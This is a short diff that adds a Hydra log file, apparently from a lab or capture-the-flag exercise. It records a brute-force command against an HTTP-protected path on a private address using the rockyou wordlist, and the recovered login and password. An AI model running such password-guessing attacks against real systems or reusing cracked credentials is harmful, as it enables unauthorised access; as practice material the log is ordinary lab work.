@@ -1,0 +1,2 @@
+# Hydra v9.0 run at 2020-04-30 15:38:29 on 10.10.56.5 http-get (hydra -l bob -P /usr/share/wordlists/rockyou.txt -I -o hydra.log 10.10.56.5 http-get /protected/)
+[80][http-get] host: 10.10.56.5   login: bob   password: bubbles
